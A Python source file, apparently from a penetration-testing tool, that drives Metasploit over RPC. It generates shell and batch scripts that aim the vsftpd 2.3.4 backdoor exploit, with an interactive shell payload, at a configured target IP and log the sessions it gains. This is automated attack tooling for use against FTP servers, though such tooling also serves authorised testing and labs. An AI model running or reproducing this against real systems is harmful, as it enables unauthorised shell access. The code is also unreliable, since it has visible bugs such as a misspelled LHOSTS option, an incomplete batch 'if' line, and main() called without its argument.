from pymetasploit3.msfrpc import AuthManager
import augrs.base as base
import os

def main(client):
    print('Resource Script Module')
    while True:
        print('press [1] to see current rc file') # might change to show and select availabe rc
        print('press [2] to run a rc file')
        print('press [0] to go back')
        command = input('Input RC Command Here: ')
        if command == '1':
            print('working in progress')
        elif command == '2':
            os.system('cls' if os.name == 'nt' else 'clear')
            print('Executing rc file via msfconsole')
            run_resource_script(client)
        elif command == '0':
            os.system('cls' if os.name == 'nt' else 'clear')
            break
        else:
            print('Error: Command Not Found..')

# This line runs the main function
if __name__ == "__main__":
    main()

def generate_resource_script(commands,filename,targetos,folder_path):
    ttl = base.settings['TTL(s)']
    ip_address = base.settings['target_ip']
    if(targetos == 'linux'):
        with open(folder_path + '/' + filename +'.sh', 'w', newline='\n') as f:
            f.write(f"#!/bin/bash\n")
            f.write(f"which msfconsole > /dev/null 2>&1\n")
            f.write(f"if [ $? -ne 0 ]; then\n")
            f.write(f'  echo "Metasploit is not installed. Please install it and try again."\n')
            f.write(f"  exit 1\n")
            f.write(f"fi\n")
            f.write('now=$(date +"%Y%m%d_%H%M%S")\n')
            f.write(f'resource_file="\n') # start resource file text
            f.write(f'setg RHOSTS {ip_address}\n')
            f.write(f'setg LHOSTS 127.0.0.1\n')
            #loop
            for command in commands:
                f.write(command + '\n')
            f.write(f'use exploit/unix/ftp/vsftpd_234_backdoor\n')
            f.write(f'set PAYLOAD cmd/unix/interact\n')
            #end loop
            f.write(f'spool /shared-vol/rc_report_$now.txt\n')
            f.write(f'run -j -z\n')
            f.write(f'sleep {ttl}\n')
            f.write(f'sessions -v\n')
            f.write(f'spool off\n')
            f.write(f'exit -y\n')
            # f.write(f"echo \"use exploit/unix/ftp/vsftpd_234_backdoor\" > /tmp/resource.rc\n")
            # f.write(f"echo \"set PAYLOAD {payload}\" >> /tmp/resource.rc\n")
            # f.write(f"echo \"set RHOSTS {lhost}\" >> /tmp/resource.rc\n")
            f.write(f'"\n')
            f.write(f'echo "$resource_file" | msfconsole -q -r /dev/stdin')

        os.chmod(folder_path + '/' + filename +'.sh', 0o755)
        with open(folder_path + '/' + filename +'.sh', 'rb') as f:
            content = f.read()
        with open(folder_path + '/' + filename +'.sh', 'wb') as f:
            f.write(content.replace(b'\r\n', b'\n'))
        print('Script Create in ' + folder_path)
    elif(targetos == 'window'):
        with open(folder_path + '/' + filename +'.bat', 'w', newline='\n') as f:
            f.write(f"@echo off\n")
            f.write(f"where msfconsole >nul 2>&1\n")
            f.write(f" %errorlevel% neq 0 (\n")
            f.write(f'  echo "Metasploit is not installed. Please install it and try again."\n')
            f.write(f"  exit /b 1\n")
            f.write(f")\n")
            f.write('set now=%date:~10,4%%date:~4,2%%date:~7,2%_%time:~0,2%%time:~3,2%%time:~6,2%\n')
            f.write(f'set resource_file=^\n') # start resource file text
            f.write(f'setg RHOSTS {ip_address}^\n')
            f.write(f'^setg LHOSTS 127.0.0.1^\n')
            #loop
            for command in commands:
                f.write('^'+command + '^\n')
            #end loop
            f.write(f'^spool /shared-vol/rc_report_$now.txt^\n')
            f.write(f'^run -j -z^\n')
            f.write(f'^sleep {ttl}^\n')
            f.write(f'^sessions -v^\n')
            f.write(f'^spool off^\n')
            f.write(f'^exit -y^\n')
            # f.write(f"echo \"use exploit/unix/ftp/vsftpd_234_backdoor\" > /tmp/resource.rc\n")
            # f.write(f"echo \"set PAYLOAD {payload}\" >> /tmp/resource.rc\n")
            # f.write(f"echo \"set RHOSTS {lhost}\" >> /tmp/resource.rc\n")
            f.write(f'^\n')
            f.write(f'echo %resource_file% | msfconsole -q -r -')
            print('Script Create in ' + folder_path)
        
def run_resource_script(msf_client):
    # result = msf_client.modules.execute('resource', constant.resouce_path)
    console_id = msf_client.call('console.create')['id']
    # Run the commands in the console
    # result = msf_client.call('console.run')
    # msf_client.call('console.write', [console_id, 'help\n'])
    msf_client.call('console.write', [console_id, 'resource '+ base.RESOURCE_PATH + 'resource_script.rc\n'])
    # output = msf_client.call('console.read', [console_id])

    while True:
        try:
            output = msf_client.call('console.read', [console_id])
            # msf_client.call('console.write', [console_id, 'exit -y\n'])
            if output['data'] != '':
                print(output['data'])
        except:
            print('exiting resource output')
            msf_client.call('console.destroy',[console_id])
            break
